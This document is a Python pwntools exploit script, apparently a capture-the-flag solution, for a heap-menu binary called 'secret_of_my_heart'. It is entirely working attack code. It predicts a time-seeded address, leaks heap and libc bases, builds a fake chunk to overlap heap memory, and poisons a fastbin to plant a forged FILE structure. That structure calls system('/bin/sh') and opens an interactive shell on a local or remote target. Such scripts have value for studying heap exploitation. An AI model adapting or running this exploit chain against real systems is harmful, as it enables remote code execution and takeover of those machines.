#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
from ctypes import CDLL

exe = context.binary = ELF('secret_of_my_heart_patched')
libc = ELF("./libc_64.so.6")

context.terminal = ['gnome-terminal', '--maximize', '-e']
context.log_level = 'info'

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE: 
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

def init():
    global io

    io = start()

def get_rw_region(seed):
    lib = CDLL(None)
    lib.srand(seed)
    addr = 0x0
    while (addr <= 0x10000):
        addr = lib.rand() & 0xFFFFF000
    return addr

def add_secret(size, name, secret):
    io.sendlineafter(b":", b"1")
    io.sendlineafter(b":", str(size).encode())
    io.sendafter(b":", name)
    io.sendafter(b":", secret)

def show_secret(index):
    io.sendlineafter(b":", b"2")
    io.sendlineafter(b":", str(index).encode())

def delete_secret(index):
    io.sendlineafter(b":", b"3")
    io.sendlineafter(b":", str(index).encode())

def spawn_shell():
    io.sendlineafter(b":", b"4")

def solve():
    
    current_time = int(time.time())
    secret_t = get_rw_region(current_time)
    info("secret_t region: %#x", secret_t)
    
    add_secret(0x38, b"A"*32, b"A"*0x8)
    show_secret(0)
    io.recvuntil(b"A"*32)
    leak = u64(io.recv(6).ljust(8, b"\x00"))
    heap_base = leak - 0x10
    info("heap base: %#x", heap_base)

    chunk = heap_base + 0x30
    fake_chunk = p64(0x0) + p64(0x31) + p64(chunk - 0x18) + p64(chunk - 0x10) + p64(heap_base + 0x10) + b"A"*0x8 + p64(0x30)
    fake_size = 0x31

    delete_secret(0)
    add_secret(0xf8, b"A", b"B"*8)
    add_secret(0x38, p64(fake_size), fake_chunk)
    add_secret(0x60, p64(0x21), b"A"*0x18)
    for i in range(2): delete_secret(i)
    add_secret(0x38, b"w00t", b"C"*0x8 + p64(0x191 + 0x10))

    add_secret(0xf8, b"shrink1", b"D"*0x8)
    add_secret(0x20, b"shrink2", b"E"*0x8)
    show_secret(2)
    io.recvuntil(b"Secret : ")
    leak = u64(io.recv(6).ljust(8, b"\x00"))
    libc.address = leak - 0x3c3b78
    info("libc base: %#x", libc.address)

    fsop_target = libc.address + 0x3c44fd

    file = FileStructure()
    file.flags = b"/bin/sh\0"
    file._IO_write_ptr = 0x2
    file._IO_write_base = 0x1
    file.chain = libc.sym["system"]
    file.vtable = heap_base + 0x210

    fake_io = bytes(file)

    add_secret(0x60, b"A"*0x8, b"uaf")
    add_secret(len(fake_io), b"A"*0x8, fake_io)
    add_secret(0x60, b"A"*0x8, b"middle")

    delete_secret(2)
    delete_secret(6)
    delete_secret(4)

    add_secret(0x60, b"A"*0x8, p64(fsop_target))
    for _ in range(2): add_secret(0x60, b"A"*0x8, b"padding")
    add_secret(0x60, b"A"*0x8, cyclic(19) + p64(heap_base + 0x1c0))

    spawn_shell()

    io.interactive()


def main():
    
    init()
    solve()
    

if __name__ == '__main__':
    main()

